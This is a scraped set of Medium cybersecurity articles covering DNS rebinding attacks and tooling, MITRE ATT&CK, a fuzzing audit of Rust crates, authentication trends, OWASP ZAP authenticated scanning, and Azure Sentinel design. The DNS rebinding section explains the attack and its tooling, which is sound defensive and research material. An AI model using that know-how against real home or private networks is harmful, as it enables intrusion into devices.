How is it that so many devices today could be vulnerable to an attack that was introduced over ten years ago? There are likely more reasons for this than I can explain, but I’m willing to bet money on two of them.
The first is awareness. Best I can tell, DNS rebinding isn’t as popular of an attack as it should be. Sure, security nerds may have heard of it but I’d wager that very few of them have actually ever tried it. It’s historically been a sort of cumbersome and difficult to pull off attack in practice. You have to spin up a malicious DNS server in the cloud, write some custom JavaScript payload targeting a specific service, serve that to a victim on a target network, and then figure out how to use their web browser to pivot to a target machine running that service, which you probably don’t know the IP address of. There’s overhead and it’s error prone. (I’ve written some tooling to ease some of that pain. More below…)
We need developers to write software that treats local private networks as if they were hostile public networks.
Even if DNS rebinding becomes more popular in cybersecurity communities, that isn’t a guarantee that we’ll see a large drop in the number of vulnerable devices. That’s because security nerds aren’t the ones implementing these APIs, web developers are. Sure web developers should know that externally facing API endpoints need authorization of some kind, but there is a recurring general consensus that private networks themselves can be used to secure intranet facing APIs. Local APIs consistently offload trust and security to the private network itself. Why would your local REST API need authorization if your router has it? Entire protocols like UPnP are built around the idea that devices on the same network can trust each other. This is the root of the problem.
We need developers to write software that treats local private networks as if they were hostile public networks. The idea that the local network is a safe haven is a fallacy. If we continue to believe it people are going to get hurt.
As the user of a product or service you are often at the mercy of the the people who built it. Fortunately, in the case of DNS rebinding, you have some control over protecting your network so long as you can make changes to your router’s configuration. OpenDNS Home is a free DNS service that can be configured to filter suspicious IP addresses like private IP ranges out of DNS responses. You should be able to change the DNS server your router uses from the default ISP’s DNS server to one of OpenDNS Home’s DNS servers in your router settings.
If you’d prefer to control this filtering on your router itself instead of trusting a public DNS server like OpenDNS to do it, you can use Dnsmasq or opt to install libre router firmware like DD-RT on the router itself. Either of these solutions are adequate if you have control over your router, but watch out, because you may still be a target of DNS rebinding attacks whenever you are on a network that hasn’t been explicitly configured to protect against them.
If you’re a developer, or are involved in creating a product that has an HTTP API, there are several things you can do to protect it from DNS rebinding attacks. There are three simple solutions to choose from.
The first, and simplest to implement without side-effects to your existing system, is to add “Host” header validation to your HTTP server. This header is included in all HTTP requests sent from a modern browser and it contains the host (hostname:port) of the server it is expecting to communicate with. This value can be a domain name or an IP address, but either way, the server that receives the request should validate that it’s own host matches the host being requested. Because DNS rebinding relies on the change of an underlying IP address associated with a domain name, the Host header included in a malicious HTTP request that’s been rebound to a target service will maintain the original domain name as its Host header value. A malicious POST request to your router’s login page will have a Host header value that doesn’t match your router’s hostname or IP address on the network. It would instead look like Host: malicious.website. Web servers should validate that the requested Host header matches it’s expected value exactly and respond with a 403 Forbidden HTTP status code if it doesn’t. I’ve written an NPM module that does this for Express.js web servers, but it should be pretty easy to implement in any web server or language.
Another effective method of spoiling DNS rebinding attacks is to use HTTPS instead of HTTP, even for local network connections. When rebinding occurs, the service being targeted will have an SSL certificate that isn’t valid for malicious.website and so a security warning will block the request from reaching your API endpoint. This solution has the added bonus of providing extra privacy and security for your users in general with the usual benefits that come with TLS/SSL. Vendors have historically shied away from shipping IoT devices with their own TLS/SSL certificates, but the Plex media server software has tackled this problem in an interesting way by actually using DNS rebinding to issue certificates and protect their customers!
Probably the best solution, albeit the one that involves the most potential disruption to your existing service, is to add some form of user authentication to your API. If your API controls real world functionality or provides access to sensitive information it should be accessible to select parties only. Period. It should not be accessible to the entire private network and therefore the public Internet as well through DNS rebinding. There is absolutely no reason that any device on the WiFi network should be able to arbitrarily control the heat in a building. People forget how easy it is to crack WPA2 WiFi.
To help spread awareness of DNS rebinding attacks I’ve built tooling and libraries that others can use to author their own DNS rebinding attacks. Aside from the JavaScript payload written to target a specific device or service, the process of delivering that payload, interacting with the malicious DNS server, and enumerating hosts on the victim’s private network is pretty much the same between different attack targets. To lower the barrier to entry to learn about and perform DNS rebinding attacks, I’ve open sourced:
Whonow is a custom DNS server that lets you specify DNS responses and rebind rules dynamically using domain requests themselves. Here’s an example of how it works:
What’s great about dynamic DNS Rebinding rules is that you don’t have to spin up your own malicious DNS server to start exploiting the browser’s same-origin policy. Instead, everyone can share the same public whonow server running on port 53 of rebind.network.
You can try it now if you’d like, just use dig to query the public whonow instance. It responds to requests for *rebind.network domain names.
Whonow always sets TTL values to one second so you can expect that it’s responses won’t stay in a DNS resolver’s cache for long.
DNS Rebind Toolkit is a utility library that automates the process of executing DNS rebinding attacks. Once you’ve written a JavaScript payload to target a specific service, DNS Rebind Toolkit can help you deploy that attack on a victim’s network.
Launching an attack against a Google Home device on a 192.168.1.1/24 subnet is as easy as embedding a code snippet in and index.html page.
That index.html file will launch the attack, spawning one iframe for each IP address in the array passed to rebind.attack(…). Each iframe embeds payloads/google-home.html with the following JavaScript snippet:
Thanks to Lily Hay Newman for three months of helpful conversations leading towards her coverage of this research in WIRED. Mega-thanks to William Robertson for his help with this work, especially for letting me pwn his home network + Sonos device �. I’d also like to thank the security teams at both Roku and Sonos for their swift response in developing and deploying firmware updates to protect their users against DNS rebinding attacks.
Below are a collection of DNS rebinding resources I’ve found useful in my research. You might too!
Written by
","['TTL value', 'smart thermostat', 'whonow', 'DNS', 'Security', 'Cybersecurity', 'Hacking', 'Vulnerability']"
ATT&CK 101 - MITRE ATT&CK™ - Medium,https://medium.com/mitre-attack/att-ck-101-17074d3bc62?source=tag_archive---------4-----------------------,"This post was originally published May 3, 2018 on mitre.org.
ATT&CK stands for Adversarial Tactics, Techniques, and Common Knowledge. MITRE started this project in 2013 to document common tactics, techniques, and procedures (TTPs) that advanced persistent threats use against Windows enterprise networks. ATT&CK was created out of a need to document adversary behaviors for use within a MITRE research project called FMX. FMX’s objective was to investigate use of endpoint telemetry data and analytics to improve post-compromise detection of adversaries operating within enterprise networks. Much of that work is documented here: Finding Threats with ATT&CK-based Analytics and the Cyber Analytics Repository.
Based on our research, we decided we needed a framework to address four main issues:
We strongly believe that offense is the best driver for defense. An organization’s ability to detect and stop an intrusion improves greatly by maintaining strong offense and defense teams that work together. Within FMX, ATT&CK was the framework used to build adversary emulation scenarios. The emulation team used these scenarios to inject real-world inspired activity into the network. Then the team used the tests to verify that the sensors and analytics were working to detect adversarial behavior within a production network. The approach resulted in a rapid improvement in detection capability, and, most importantly, in a measured and repeatable way.
ATT&CK became the go-to tool both for the adversary emulation team to plan events and for the detection team to verify their progress. This was such a useful process for MITRE’s research program that we felt it should be released to benefit the entire community, so MITRE released ATT&CK to the public in May 2015. ATT&CK has since expanded significantly to incorporate techniques used against macOS and Linux, behaviors used by adversaries against mobile devices, and adversary strategies for planning and conducting operations pre-exploit.
ATT&CK is largely a knowledge base of adversarial techniques — a breakdown and classification of offensively oriented actions that can be used against particular platforms, such as Windows. Unlike prior work in this area, the focus isn’t on the tools and malware that adversaries use but on how they interact with systems during an operation.
ATT&CK organizes these techniques into a set of tactics to help explain to provide context for the technique. Each technique includes information that’s relevant to both a red team or penetration tester for understanding the nature of how a technique works and also to a defender for understanding the context surrounding events or artifacts generated by a technique in use.
Tactics represent the “why” of an ATT&CK technique. The tactic is the adversary’s tactical objective for performing an action. Tactics serve as useful contextual categories for individual techniques and cover standard, higher-level notations for things adversaries do during an operation, such as persist, discover information, move laterally, execute files, and exfiltrate data.
Techniques represent “how” an adversary achieves a tactical objective by performing an action. For example, an adversary may dump credentials to gain access to useful credentials within a network that can be used later for lateral movement. Techniques may also represent “what” an adversary gains by performing an action. This is a useful distinction for the Discovery tactic as the techniques highlight what type of information an adversary is after with a particular action. There may be many ways, or techniques, to achieve tactical objectives, so there are multiple techniques in each tactic category.
The relationship between tactics and techniques can be visualized in the ATT&CK Matrix. For example, under the tactic Persistence (this is the adversary’s goal — to persist in the target environment), there are a series of techniques including AppInit DLLs, New Serviceand Scheduled Task. Each of these is a single technique that adversaries may use to achieve the goal of persistence.
The ATT&CK Matrix is probably the most widely recognizable aspect of ATT&CK because it’s commonly used to show things like defensive coverage of an environment, detection capabilities in security products, and results of an incident or red team engagement.
Another important aspect of ATT&CK is how it integrates cyber threat intelligence (CTI). Unlike previous ways of digesting CTI that were used primarily for indicators, ATT&CK documents adversary group behavior profiles, such as APT29, based on publicly available reporting to show which groups use what techniques.
Usually, individual reports are used to document one particular incident or group, but this makes it difficult to compare what happened across incidents or groups and come to a conclusion on what types of defenses were most effective. With ATT&CK, analysts can look across groups of activity by focusing on the technique itself. When deciding how to focus defensive resources, analysts might want to start with techniques that have the highest group usage.
Examples of how particular adversaries use techniques are documented in its ATT&CK page, which represents that group’s procedure for using the technique. The procedure is a particular instance of use and can be very useful for understanding exactly how the technique is used and for replication of an incident with adversary emulation and for specifics on how to detect that instance in use.
ATT&CK has expanded quite significantly over the past five years, from Windows to other platforms and technologies. It’s in use by many different government organizations and industry sectors, including financial, healthcare, retail, and technology. The public adoption and use has led to significant contributions back to ATT&CK to keep it up-to-date and useful for the community. We want to continue this trend, so MITRE has big plans to keep growing ATT&CK to ensure its future as a valuable public resource.
Now that we’ve covered some of the basics, you can look forward to future blog posts that go into more detail on topics covered within this post. We’ll discuss the use of ATT&CK with cyber threat intelligence, behavior-based detection analytics, and adversary emulation, as well as additional areas.
Written by
","['Blog Archives', 'Getting Started', 'ATT&CK', 'Cybersecurity', 'Mitre Attack', 'Information Security', 'Threat Hunting', 'Threat Intelligence']"
Auditing popular Rust crates: how a one-line unsafe has nearly ruined everything,https://medium.com/@shnatsel/auditing-popular-rust-crates-how-a-one-line-unsafe-has-nearly-ruined-everything-fab2d837ebb1?source=tag_archive---------8-----------------------,"Following the actix-web incident (which is fixed now, at least mostly) I decided to poke other popular Rust libraries and see what comes of it.
The good news is I’ve poked at 6 popular crates now, and I’ve got not a single actually exploitable vulnerability. I am impressed. When I poked popular C libraries a few years ago it quickly ended in tears. The bad news is I’ve found one instance that was not a security vulnerability by sheer luck, plus a whole slew of denial-of-service bugs. And I can’t fix all of them by myself. Read on to find out how I did it, and how you can help!
My workflow was roughly like this:
Turns out Rust community is awesome and not only has excellent integration for all three practical fuzzers along with a quick start guide for each, but also a huge collection of fuzz targets that covers a great deal of popular crates. Ack! Getting low-hanging fruit at step 1 is foiled!
So I’ve started checking whether fuzzing targets were written properly. Specifically, I’ve started looking for stuff that could block fuzzing — like checksums. A lot of formats have them internally, and PNG has not one but two — crc32 in png format and adler32 in deflate. And lo and behold, none of the crates were actually disabling checksums when fuzzing! This means that random input from fuzzer was rejected early (random data does not have a valid checksum in it, duh) and never actually reached the interesting decoding bits. So I’ve opened PRs for disabling checksums during fuzzing in miniz_oxide, png, lodepng-rust, and ogg, and then fuzzed them with checksums disabled. This got me:
inflate crate was the first where fuzzing has turned up nothing at all, so I've started eyeballing its unsafes and trying to rewrite them into safe code. I've added a benchmarking harness and started measuring whether reverting back to safe code hurts performance. cargo bench was too noisy, but I've quickly discovered criterion which got me the precision I needed (did I mention Rust tooling is awesome?). I got lucky - there were two unsafes with two-line safe equivalent commented out, and reverting back to safe code created no measurable performance difference. Apparently the compiler got smarter since that code was written, so I've just reverted back to safe code.
This left just one unsafe with a single line in it. Spot the security vulnerability. I would have missed it if the crate maintainer hadn’t pointed it out. If you can’t, there are hints at the end of this post.
By sheer luck the rest of the crate just so happens to be structured in a way that never passes input parameters that trigger the vulnerability, so it is not really exploitable. Probably. I could not find a way to exploit it, and the crate maintainer assures me it’s fine. Perhaps we just haven’t figured out how to do it yet. After all, almost everything is exploitable if you try hard enough.
Sadly, simply replacing the unsafe .set_len() with .resize() regressed the decompression performance by 10%, so instead I've added an extra check preventing this particular exploit from happening, and then liberally sprinkled the function with asserts that panic on every other way this unsafe could go wrong that I could think of.
Is the function secure now? Well, maybe. Maybe not. Unless we either rewrite it in safe rust (or prove its correctness, which is a lot harder) we will never know.
The thing is, I’m pretty sure it’s possible to rewrite this in safe Rust without performance penalty. I’ve tried some local optimizations briefly, to no avail. Just like with high-level languages, writing fast safe Rust requires staying on the optimizer’s happy paths, and I have not found any documentation or tooling for doing that. https://godbolt.org/ that lets you inspect the LLVM IR as well as assembler and shows what line of Rust turned into what line of assembly, but you can’t feed your entire project to it. (As pointed out in comments, cargo-asm can do that to an entire project). And you also need tools to understand why a certain optimization was not applied by rustc. LLVM flags -Rpass-missed and -Rpass-analysis seem to be capable of doing that, but there is literally no documentation on them in conjunction with Rust.
Discussing the vulnerability further would be spoilerrific (seriously, try to locate it yourself), so I’ll leave further technical discussion until the end of the post. I want to say that I was very satisfied with how the crate maintainer reacted to the potential vulnerability — he seemed to take it seriously and investigated it promptly. Coming from C ecosystem it is refreshing to be taken seriously when you point out those things.
By contrast, nobody seems to care about denial of service vulnerabilities. In the 3 crates I’ve reported such vulnerabilities for, after 3 weeks not a single one was investigated or fixed by maintainers of those crates, or anyone else really. And the DoS bugs are not limited to panics that you can just isolate into another thread and forget about.
After not getting any reaction from crate maintainers for a while I tried fixing those bugs myself, starting with the png crate. In stark contrast to C, it is surprisingly easy to jump into an existing Rust codebase and start hacking on it, even if it does rather involved things like PNG parsing. I've fixed all the panics that fuzzers discovered based on nothing but debug mode backtraces, and I don't even know Rust all that well. Also, this is why there are 4 distinct panics listed for PNG crate: I've fixed one and kept fuzzing until I discovered the next one. lewton probably has many more panics in it, I just didn't got beyond the first one. Sadly, three weeks later my PR is still not merged, reinforcing the theme of ""nobody cares about denial of service"". And png still has a much nastier DoS bug that cannot be isolated in a thread.
(To be clear, this is not meant as bashing any particular person or team; there may be perfectly valid reasons for why it is so. But this does seem to be the trend throughout the ecosystem, and I needed some examples to illustrate it).
Also, shoutout to tungstenite — it was the only crate that did not exhibit any kinds of bugs when being fuzzed for the first time. Kudos.
Conclusions:
Originally I thought this would be a fun exercise for a few weekends, but the scope of the work quickly grew way beyond what I can hope to achieve alone. This is where you come in, though! Here’s a list of things you can try, in addition to the hard tooling tasks listed above:
I’d love to keep fixing all the things, but at least in the coming month I will not able to dedicate any time to the project. I hope I’ve managed to at least lead by example.
And now, details on that vulnerability! If you haven’t found it yourself, here’s a hint: similar bugs in C libraries.
If you still haven’t found it, see the fix.
Spoilerrific discussion of the vulnerability below.
Vulnerable code from git history for reference
The function run_len_dist() does a fairly trivial thing: resizes a vector to fit a specified amount of data and copies data from element i to element i+dist until i+dist hits the end of the vector. For performance, contents of the vector are not initialized to zeroes when resizing, as it would have been done by vec.resize(); instead, vec.set_len() is used, creating a vector with a number of elements set to uninitialized memory at the end.
The function never checks that dist is not zero. Indeed, if you call it with dist set to 0, it will simply read uninitialized memory and write it right back, exposing memory contents in the output.
If this vulnerability were actually exploitable from the external API (which it isn’t, probably), inflate would have output contents of uninitialized memory in the decompressed output. inflate crate is used in png crate to decompress PNGs. So if png crate was used in a web browser (e.g. servo) to decode images, an attacker could pass a crafted PNG to the client, then read the decoded image using javascript. This lets the attacker read memory contents from the browser - cookies, passwords, you name it. This is not quite as bad as Heartbleed or Meltdown, but it's up there.
Sadly, regular fuzzing would not have discovered this vulnerability. If it were actually exploitable, at least one way to trigger it would involve setting several distinct bytes in the input to very specific values. And even the best current generation fuzzers cannot trigger any behavior that requires changing more than one byte simultaneously, except in rare cases or if you explicitly tell what consecutive byte strings it should try. And there is nothing in the code that would guide the fuzzers to these specific values.
Even if fuzzers did discover such an input by random chance, they would not have recognized it as a vulnerability, unless you do either of these things:
This just goes to show that fuzzing unsafe code does not actually guarantee absence of bugs.
Safe Rust, however, does guarantee absence of memory errors that lead to arbitrary code execution exploits and other unspeakable horrors. So let’s use it.
Join the discussion this article on Reddit
Written by
","['fuzzed', '4 distinct panics', 'memory exhaustion', 'Memory leak', 'panic', 'afl.rs', 'cargo-fuzz', 'honggfuzz-rs', 'sanitizers', 'criterion', 'proptest', 'clippy', 'lewton', 'serde-json', 'KLEE', 'SAW', 'SMACK', 'adapted', 'crates.io', 'exists', 'trophy case', 'fuzz', 'harnesses', 'just one', 'two', 'Rust', 'Security', 'Vulnerability', 'Programming', 'Cybersecurity']"
Authentication Trends For 2017 - Passwordless Security | UNLOQ,https://blog.unloq.io/authentication-trends-for-2017-5f346a2c0823?source=tag_archive---------7-----------------------,"It’s that time of the year again. It’s time for next year’s predictions on security and emerging technologies. 2016 was yet another year in which cyber-crime reached new heights, topping the previous year’s portfolio of threats.
The increase in hacktivism, new technologies and minuscule security budgets for companies create the perfect storm for more sophisticated threat mechanisms.
One thing is for sure, though: all this storm, in turn led to an increase in awareness regarding cyber-security threats and methods of mitigating these threats.
Companies realized that by going with the same security strategies, they can’t expect different results. Their inability to influence the course of cyber-crime within the organisation is a clear indicator of this need of change. At most, the lucky ones were able to slow down and even redirect the attacks, but not stop or significantly reduce them.
Governments and companies finally acknowledged its importance and started pouring big bucks into data protection.
One thing is for sure, though: 2016 was a good year for cyber- security awareness. Governments and companies finally acknowledged its importance and started allocating funds for data protection.
CISOs have moved towards a more proactive approach regarding cybersecurity and are focusing on areas within their control. Their top initiatives in 2016 (in the US) are:
With a total of 29% of US CISOs concentrating on Identity and access management (IAM), the top position in their priorities’ list is taken by Multifactor authentication, with 77%. Threats targeted at employees, such as phishing, pharming, social engineering and ransonware are the ones that most concern CISOs.
Although being a top priority, CISOs continue to face a series of barriers when implementing IAM solutions within the company, including costs, legislation and company priorities.
Gartner defines “user authentication” as the real-time corroboration of a person’s claimed digital identity with an implied or notional level of trust.*
The user authentication market includes several types of products and services, which enable the implementation of a variety of authentication methods that aim at accompanying or removing altogether the classic password-based systems.
The 3 main authentication methods are:
The most common form of single factor authentication is the password-based authentication. Passwords have been around since the early days of computing, about 55 years now.
A password is an unspaced sequence of characters used to determine that a computer user requesting access to a computer system is really that particular user.**
It’s only natural that in such a fast paced environment, what used to work 55 years ago is not sufficient anymore.
Passwords are indeed the weakest link in the security chain, and this is due to:
Sure, there are plenty of password managers out there, but even these tools are proven vulnerable once in a while.
The interest for passwords is not decreasing, as Google searches for the term “Password” is overall consistent, which means that they are still the primary authentication method for most users and systems.
Despite this consistent interest, passwords are being hunted down by the creators of the WWW themselves, who created a consortium, called the World Wide Consortium. This initiative aims at replacing passwords with more secure ways of logging into websites, as “Strong authentication is useful to any Web application that wants to maintain an ongoing relationship with users”***.
Having taken all of these facts into account, we conclude:
2017 Prediction: Password-based authentication will stagnate
Two factor authentication is basically an upgrade to the traditional password-based authentication, resulted by adding an extra step to the log in process (the second factor).
Two-factor authentication (2FA), often referred to as two-step verification, is a security process in which the user provides two authentication factors to verify they are who they say they are, as opposed to single-factor authentication (SFA), where the user provides only one factor — typically a password.****
2FA has been around for quite a while now, but it wasn’t noticed by users as such: a different authentication system.
The interest for this type of authentication is increasing quite abruptly, as the Google searches for the term “Two factor authentication” are on the rise, especially in the second half of 2016.
One of the most common forms of two factor authentication is SMS- based, as it is largely used by most financial institutions.
Although widespread, SMS-based 2FA is now considered insecure, due to the fact that they are sent through various insecure systems, and there is the risk of the SMSs being intercepted by undesired parties.
The National Institute of Standards and Technology from the US Department of Commerce released a draft which contains new recommended standards for authentication. This draft recommends other authentication methods than SMS-based ones:
“OOB using SMS is deprecated, and will no longer be allowed in future releases of this guidance.”*****
2017 Prediction: Two Factor authentication adoption will further increase
A much more secure alternative to the two factor authentication mechanism is Multi-factor authentication.
Multi-factor authentication (MFA) is a security system that requires more than one method of authentication from independent categories of credentials to verify the user’s identity for a login or other transaction.******
MFA creates a layered defense system that makes it harder for hackers to break in, since they would have to hack all the independent credentials:
Even though the Google searches for the term “Multi-factor authentication” didn’t see an abrupt increase, as in the case of 2FA, it sees a steady, rhythmic evolution.
A report released by Markets And Markets reveals that the market for Multi-factor authentication is projected to surpass $9.6 billion, applicable across various domains (Travel & Immigration, Government, Banking, Defense, Commercial, Security, Consumer electronics, Healthcare).
Besides the high level of security, multi-factor authentication allows a certain degree of flexibility, the company being able to set the desired level of security, depending on its users’ profile, and needs.
2017 Prediction: Multi-factor authentication is increasing steadily
As the world is increasingly concerned about privacy and data protection, hacking sophistication rises, companies and governments worldwide are forced to come up with more efficient cyber-security tools.
The evolution of the cyber-security market is influenced by a several factors, ranging from usability, security awareness and demand, budgets and legislation, so the authentication trends for 2017 are partly wishful thinking.
Sources:
*https://www.gartner.com/doc/3210517/market-guide-user-authentication
**http://searchsecurity.techtarget.com/definition/password
***https://www.w3.org/2016/02/securewebauthwg.html.en
****http://searchsecurity.techtarget.com/definition/two-factor-authentication
*****https://pages.nist.gov/800-63-3/
******http://searchsecurity.techtarget.com/definition/multifactor-authentication-MFA
http://www.marketsandmarkets.com/Market-Reports/next-generation-biometric-technologies-market-697.html
http://www.acuity-mi.com/images/IR09.JPG
https://www.tractica.com/resources/white-papers/biometrics-10-trends-to-watch/
https://dupress.deloitte.com/dup-us-en/industry/public-sector/nascio-survey-government-cybersecurity-strategies.html
http://aic.gov.au/media_library/publications/tandi_pdf/tandi512.pdf
http://www.csoonline.com/article/3150997/security/what-2017-has-in-store-for-cybersecurity.html
Written by
","['Product', 'Authentication', 'Cybersecurity', '2FA Guides', 'Dev Tools', 'Whitepaper', 'UNLOQ.io', 'Cybersecurity', 'Authentication', '2fa', 'MFA', 'Passwords']"
Automating Authenticated API vulnerability scanning with OWASP ZAP,https://medium.com/faun/automating-authenticated-api-vulnerability-scanning-with-owasp-zap-eaddba0c2e94?source=tag_archive---------9-----------------------,"Performing authenticated application vulnerability scanning can get quite complex for modern applications or APIs. The problem gets worse if you want to integrate with your CICD pipeline. Even commercial vulnerability scanners struggle with this problem. Over the years OWASP ZAP community has done an excellent job of extending ZAP’s features and functionalities. However, I must admit ZAP has a steep learning curve but once you get over that hurdle you will love ZAP. One of the best functionality in ZAP is it’s scripting capabilities. You can write your own scripts in python, JavaScript, ZEST or Ruby. In this post we will explore how we can handle complex authentication using this scripting functionality. This post is for intermediate users who already know how ZAP works and novice programming skill is required.
In this post, we will take the demo vulnerable application Hackazon. Hackazon provides vulnerable APIs which we will use for this demo. You can download the vulnerable docker image of the Hackazon application and the scripts we will use in this tutorial here. This post will focus on API testing but the scripting knowledge will be similar to web applications.
First, let’s analyse our target and take a look at how the authentication works for Hackazon API.
First, you have to make a usual Basic-Authorization request, and in response you will receive the token. Then just send this token in every request in Authorization header or as a request parameter Token.
Step 1: Authorization: Basic dGVzdF91c2VyOjEyMzQ1Ng== On every basic authorization request without _token parameter new token will be generated. You can have only one token, so if you use it in several places, do not call basic authorization requests, do it only once, and then use received token.
Step 2 (and consequent):
Authorization: Token af538baa9045a84c0e889f672baf83ff24
You can find more information about the REST API here: https://github.com/rapid7/hackazon/blob/master/REST.md
ZAP will first do basic authenticate to the /api/auth endpoint. After the basic authentication hackazon app will send an authorization token in the JSON response body. ZAP script will extract the token and subsequent request to the endpoint will include this token as part of the request header. We will need another httpsender script to add this token to each subsequent requests.
To set up the vulnerability scan settings will take the following steps:
1. Create a ZAP context
2. Create a ZAP scan policy
3. Write custom ZAP script for authentication and proxy.
4. Automate testing using:
a. Python script
5. Review the scan results
Create a ZAP context
We will use ZAP context to configure the application’s profile. I included the context file (Hackazon_API_Context.context) file for this demo in the github repo above. The important sections of the context are structure, authentication, technology and user.
We will use script based authentication for this post. It should look like below after we finish writing our script:
Create a ZAP Scan policy
In order to scan efficiently, we will tweak the scan profile. For example, we only want to do injection test and also we know that the database is MySQL and hence would like to test MySQL related SQL injection payloads only. This will increase the performance of the scan significantly and help with false positives.
ZAP custom script for authentication and proxy
ZAP provides authentication mechanism for basic use cases, for example: form based authentication, etc. But authentication is not one size fits all. Everyone tries to do it differently. For example in this Hackazon API case, you need to do basic authentication, obtain a token and pass this token on your request header on each request to access the authenticated resource. Hence we need to go through this painful process of writing custom authentication and httpsender scripts.
The authentication script will be tied with the context defined earlier. For example: you can pass authentication url, target urls, username or password field, etc from the context menu. For our case, we just need the authentication url.
N.B: You need to download Python engine from ZAP Marketplace to write python scripts it’s not included by default.
Similarly user credentials, api keys,etc can be passed to the script from users menu on the context screen.
This credentials can be obtained from the authentication scripts as shown below.
def getCredentialsParamsNames():
return jarray.array([“Username”, “Password”], java.lang.String);
username = quote(credentials.getParam(“Username”)).encode(‘utf-8’);
password = quote(credentials.getParam(“Password”)).encode(‘utf-8’);
Finally after you finish writing the authentication script it should look like below.
Authentication script does the first part which obtains the token. Now we need to use this token for each subsequent requests. Hence we use a global variable (hackazon_token) and pass this variable to http_sender script which intercepts all requests (including from Active scan, Spidering, etc) and add this token to those requests.
Automated testing using python script:
I included a python script which can automate the entire scanning process. I wont go through this as the script is pretty self explanatory.
Once the scan is completed you will see the following results:
You can also include this scan in your CI pipeline. Unfortunately, the Official ZAP Jenkins plugin was giving me issues with the httpsender script. The httpsender script on the jenkins setup doesn't seem to change request headers as it does on the UI or python script.
I hope you found this tutorial useful. Few claps never hurt anybody � <script>action(“clap”)</script>
Feel free to provide any comment or feedback.
Join our community Slack and read our weekly Faun topics ⬇
Written by
","['Cybersecurity', 'Devsecops', 'Application Security', 'API', 'Vulnerability Management']"
Azure is Catching AWS - FutureSin - Medium,https://medium.com/futuresin/azure-is-catching-aws-45841ddb04cd?source=tag_archive---------3-----------------------,"Microsoft has again topped the $1 trillion market cap as it predicts more cloud growth. Azure’s star is still shining.
Azure, Microsoft’s flagship cloud product, competes with market leader Amazon Web Services (AWS) to provide computing power to businesses.
Azure is closing the gap with Amazon’s AWS, a Credit Suisse analyst recently suggested, citing a report that suggests the rising adoption of Microsoft’s cloud computing service. The numbers would seem to support the idea.
According to Flexera’s RightScale 2019 State of the Cloud Report, Microsoft Azure is closing the gap in market adoption with Amazon Web Services (AWS).
Just as Google Home devices are making headway in Alexa’s market lead in smart home penetration, Azure’s strong growth could be taking market share away from AWS.
Microsoft’s cloud service Azure has grown 73% in the first quarter of 2019. This is a much faster pace than in 2018.
There’s increasing evidence Azure continues to catch up with AWS overall especially among enterprises. Microsoft’s focus on cybersecurity and strong enterprise partnerships gives it a boost, even as AWS has deeper features and bigger contracts.
Microsoft’s stock has gained about 23% so far in 2019 and Microsoft’s business model centered around Azure looks stronger than in recent years.
Amazon and Microsoft, the №1 and №2 public cloud providers, are essentially a duopoly in the Cloud, much as Google and Facebook are an advertising duopoly. While Amazon is likely the 3rd horseman in Advertising for the future, Google is certainly the 3rd player in the Cloud. Meanwhile it’s not yet clear who the Cloud leaders will be in China, although Alibaba and Huawei (above Tencent) are likely winners there.
It’s not even that AWS is really under threat by Azure, it’s just a tribute to how pivotal the Cloud is to the enterprise sector.
Let’s not kid ourselves. AWS had $25.7 billion in revenue in 2018. Azure won’t catch AWS any time soon, but Azure’s strong growth along with Google’s shows the Cloud is continuing to evolve and thrive as we approach the 4th industrial revolution.
Cloud computing is driving IT spending overall. For instance, Gartner predicts that 2019 global IT spending will increase 3.2 percent to $3.76 trillion with as-a-service models fueling everything from data center spending to enterprise software.
Microsoft Azure is a very attractive option for companies with a pre-existing reliance on Microsoft products. In the long term Amazon should probably spin-off AWS as its own separate entity to keep growing and differentiating. Azure is not a 5-year threat to AWS, but in 2019 it could grow much faster. Amazon’s guidance overall is not expected to be as healthy as Microsoft’s.
With Microsoft already a very enterprise-friendly and increasingly neutral party, some analysts see Microsoft as an existential long-term threat to AWS, that will, within the next decade, take a majority or at least overtake sole position as leader of the enterprise cloud services market.
Do you agree that Azure could overtake AWS?
Written by
","['Artificial Intelligence', 'Futurism', 'Space', 'Tech', 'Privacy', 'Crypto', 'Blockchain', 'Microsoft', 'Technology', 'Cloud Computing', 'Cybersecurity', 'Digital Transformation']"
Azure Sentinel: design considerations - Maarten Goet - Medium,https://medium.com/@maarten.goet/azure-sentinel-design-considerations-492f87fae384?source=tag_archive---------9-----------------------,"I’ve written about Azure Sentinel before and how cloud SIEM’s are changing the security landscape. Microsoft provides Azure Sentinel as-a-service, which you can enable with the click of a button, only paying for the storage you use.
However, Azure Sentinel, as with any cloud services and/or SIEM, still needs some design considerations if you are putting it into production. What are these considerations? And what are the options available to me and my company?
In this article I’ll show you a couple of things to consider when designing for Azure Sentinel. From foundational choices, to identity & access, to (data) connections and dashboarding; I’ll share some real-world experiences.
Let’s look at the foundation first
Before we start, let’s make sure we are on the same page first and understand the fundamentals. Azure Sentinel uses a Log Analytics workspace as its backend, storing events and other information. Log Analytics workspaces are the same technology as Azure Data Explorer uses for its storage. These backends are ultra-scalable, and you can get back results in seconds using the Kusto Query Language (KQL).
The first thing to plan for is the Log Analytics workspace we’ll be using. When setting up Azure Sentinel for the first time, it allows you to create a new Log Analytics workspace or to pick an existing one.
DESIGN CONSIDERATION: New or existing Log Analytics workspace?
Let’s look at why would you want to re-use an existing workspace. Of course, it would be the easy way; it is already there, you’ve set up the right access to it, data is already streaming in and you can just add Azure Sentinel to it. No problem, right?
Well, access control is particularly one of the bigger reasons to potentially create a new Log Analytics workspace. That allows you to tightly control who has access to that aggregated data in Azure Sentinel, which often is a CISO requirement as we’ll be discussing below.
Apart from access control reasons, you might also run into a technical challenge that forces you to create a new workspace; it is relatively hard to move an existing Log Analytics environment over to another subscription. You need to first offboard agents, remove current Solutions, before you can move it. And that might cause ‘downtime’ for the monitoring solution currently using that workspace.
And of course, the last reason would be that sometimes you’ve created a bit of history in your current environment; experimented with settings, have a name for your workspace that you’d like to change etcetera, so you might want to start with a ‘clean slate’ because of that.
DESIGN CONSIDERATION: How long do we need to store our data?
One other thing to consider is how long you will want to store the data. The default setting will be 31 days. However, you can change this workspace setting and extend to up to two years. As per the documentation:
“The retention period of collected data stored in the database depends on the selected pricing plan. By default, collected data is available for 31 days by default, but can be extended to 730 days. Data is stored encrypted at rest in Azure storage, to ensure data confidentiality, and the data is replicated within the local region using locally redundant storage (LRS). The last two weeks of data are also stored in SSD-based cache and this cache is encrypted.”
No, Azure Sentinel will NOT replace Azure Security Center
An often-heard remark is: “Oh, so Azure Sentinel will replace Azure Security Center.” No, no no. Azure Security Center has its own place in the security landscape. It acts as the primary ‘engine’ to perform detections on Microsoft Azure, in your VM’s, in containers and on other properties such as Azure Stack, your on-premises infrastructure, etcetera.
